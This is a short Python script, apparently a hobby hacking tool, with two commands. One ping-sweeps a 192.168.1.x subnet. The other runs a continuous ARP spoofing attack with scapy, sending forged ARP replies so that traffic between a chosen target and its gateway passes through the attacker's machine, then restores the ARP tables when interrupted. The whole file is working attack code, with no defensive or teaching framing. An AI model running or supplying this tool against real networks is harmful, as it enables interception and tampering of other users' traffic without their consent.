import click
import sh

from scapy.all import *
from scapy.layers.l2 import getmacbyip, ARP


@click.group()
def app():
    pass


@app.command('scanip')
@click.option('--ip-range', help='Range ip to scan, format start:range (default 0:20)', default='0:20')
def scan_ip(ip_range):
    start, end = [
        int(num) for num in ip_range.split(':')
    ]

    for i in range(start, end):
        ip = f'192.168.1.{i + 1}'

        try:
            sh.ping(ip, '-c', 1, _out='/dev/null')  # ping current ip

            click.echo('{}\t{}'.format(
                ip, click.style('OK', fg='blue')
            ))
        except sh.ErrorReturnCode:
            click.echo('{}\t{}'.format(
                ip, click.style('FAIL', fg='red')
            ))


def exploit(gateway, ip):
    gmac = getmacbyip(gateway)
    ipmac = getmacbyip(ip)

    packet1 = ARP(
        op=2,
        pdst=ip,
        psrc=gateway,
        hwdst=gmac
    )

    packet2 = ARP(
        op=2,
        pdst=gateway,
        psrc=ip,
        hwdst=ipmac
    )

    for pack in [packet1, packet2]:
        send(pack, verbose=False)

    return ipmac, gmac


def restore(gateway, ip):
    packet1 = ARP(
        op=2,
        pdst=gateway,
        psrc=ip,
        hwdst="ff:ff:ff:ff:ff:ff",
        hwsrc=getmacbyip(ip)
    )

    packet2 = ARP(
        op=2,
        pdst=ip,
        psrc=gateway,
        hwdst="ff:ff:ff:ff:ff:ff",
        hwsrc=getmacbyip(gateway)
    )

    for pack in [packet1, packet2]:
        send(pack, verbose=False)


@app.command('spoof')
@click.option('--target-ip', prompt='Target IP')
@click.option('--gateway-ip', prompt='Gateway IP')
def spoof(target_ip, gateway_ip):
    # check current is root
    if os.getuid() != 0:
        return click.secho('You must run this command with sudo', fg='red')

    while True:
        try:
            try:
                ipmac, gmac = exploit(target_ip, gateway_ip)

                click.secho(f'[*] Packets sended ({ipmac}, {gmac})', fg='blue')
                time.sleep(1)  # wait 2 second to send next packet
            except Exception as e:
                click.secho(
                    f'[!] Error while trying to send packet, retrying..: {e}', fg='red'
                )

        except KeyboardInterrupt:
            click.secho('\nGot exit signal, restoring affected arp table', fg='bright_black')
            restore(target_ip, gateway_ip)
            exit()


if __name__ == '__main__':
    app()
